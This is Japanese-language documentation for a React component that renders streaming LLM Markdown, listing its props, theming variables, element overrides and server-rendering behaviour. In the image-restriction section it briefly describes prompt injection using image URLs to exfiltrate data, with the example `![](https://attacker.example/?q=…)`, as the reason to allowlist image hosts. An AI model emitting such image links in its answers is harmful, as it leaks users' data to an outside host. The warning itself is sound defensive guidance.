# Web レンダラー

```tsx
import { MarkdownView } from 'react-llm-markdown';
import 'react-llm-markdown/styles.css';

<MarkdownView streaming={!done}>{text}</MarkdownView>;
```

`MarkdownView` はサーバー上ではプレーンな Markdown としてレンダリングされます。その後ブラウザで Shiki、KaTeX、Mermaid、ECharts を
必要に応じて読み込むため、初回の描画は軽いままです。React 18 と 19 で動作します。

## Props

| Prop | デフォルト | |
|---|---|---|
| `children` | — | Markdown のソース。 |
| `streaming` | `false` | テキストがまだ届いている間は `true`：未完成の Markdown を補修し、新しい単語をフェードインさせます。 |
| `features` | すべて有効 | `{ code, math, mermaid, echarts, cjk }` —— いずれかを `false` にすると、それは一切読み込まれません。 |
| `softBreaks` | `true` | チャットと同じく、1 つの改行を改行として扱います。標準の Markdown にするには `false`。 |
| `isImageAllowed` | すべて | `(url) => boolean`。拒否された画像は代替テキストを表示し、リクエストされることはありません。 |
| `className` | — | ラッパー `<div class="rlm-markdown">` に追加するクラス。 |
| `components` | — | 要素の上書き。組み込みの安全なリンク・画像コンポーネントの上にマージされます。 |
| `tableMaxHeight` | `300` | これより高いテーブルは内部でスクロールします（px または CSS の長さ。`0` = 上限なし）。 |
| `codeBlockMaxHeight` | `400` | これより高いコードブロックは内部でスクロールします（`0` = 上限なし）。 |
| `lineNumbers` | `true` | コードブロックの行番号。 |

機能を無効にする場合でも、[スタートガイド](getting-started) に挙げた peer をすべてインストールしてください。バンドラーは
必要に応じて読み込むインポートをビルド時に解決します。

## 画像を制限する

デフォルトでは任意の http(s) ホストの画像が読み込まれます。画像の URL はプロンプトインジェクションがデータを外部に送信する手段にもなる
（`![](https://attacker.example/?q=…)`）ため、信頼できない回答に対しては自分のホストだけを許可してください。

```tsx
<MarkdownView isImageAllowed={(url) => url.startsWith('https://cdn.example.com/')}>{text}</MarkdownView>
```

## テーマ

ダークモードは、祖先要素（通常は `<html>`）の `dark` クラスまたは `data-theme="dark"` に従います。色は CSS 変数で指定します。

```css
:root {
  --rlm-link: #7c3aed;
  --rlm-card: #f8fafc;
  --rlm-chart-height: 400px;
}
```

| トークン | 用途 |
|---|---|
| `--rlm-background`, `--rlm-foreground` | リッチなブロックとコントロールの基本色 |
| `--rlm-muted`, `--rlm-muted-foreground` | ブロックのヘッダー、補助的なテキスト |
| `--rlm-border` | 枠線、テーブルの罫線 |
| `--rlm-card` | コード、テーブル、ダイアグラム、チャートの背景面 |
| `--rlm-primary`, `--rlm-primary-foreground` | ブロック内のボタン |
| `--rlm-sidebar`, `--rlm-ring` | オーバーレイの背景面、フォーカスリング |
| `--rlm-link` | リンク |
| `--rlm-chart-height` | ECharts の高さ |

shadcn/ui を使っている場合は、自分のテーマに対応付けてください。例：`--rlm-background: hsl(var(--background));`

## 要素を上書きする

`components` は要素のレンダリング方法を置き換えます。自分で `a` や `img` を上書きしない限り、安全なリンク・画像コンポーネントはそのまま使われます。
上書きする場合は、`rel="noopener noreferrer"` と `referrerPolicy="no-referrer"` を維持してください。

```tsx
<MarkdownView components={{ hr: () => <hr className="my-divider" /> }}>{text}</MarkdownView>
```

## サーバーレンダリング

サーバー上では、リッチなプラグインなしで GFM（テーブル、リスト、脚注）をレンダリングします。プラグインはブラウザで適用されます。
チャート、ダイアグラム、ハイライトされたコードはハイドレーションの後に表示されます。
